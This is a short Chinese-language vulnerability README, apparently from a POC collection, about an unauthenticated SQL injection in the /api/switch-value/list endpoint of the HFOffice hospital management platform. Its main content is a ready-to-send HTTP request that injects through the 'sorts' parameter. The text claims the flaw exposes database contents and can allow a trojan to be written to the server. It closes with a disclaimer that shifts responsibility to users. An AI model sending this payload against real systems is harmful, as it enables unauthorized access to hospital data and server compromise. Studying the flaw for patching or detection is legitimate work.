# HFOffice_sqlscan
>   红帆HFOffice是广州红帆科技有限公司研发的新一代医院智慧管理云平台，它采用了一系列红帆HFOffice是广州红帆科技有限公司研发的新一代医院智慧管理云平台。

## 简介

红帆HFOffice /api/switch-value/list存在SQL注入漏洞，未授权攻击者可利用该漏洞获取敏感数据库信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 漏洞类型

SQL注入

## 影响范围

-   红帆HFOffice

## POC

```http
GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-user%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
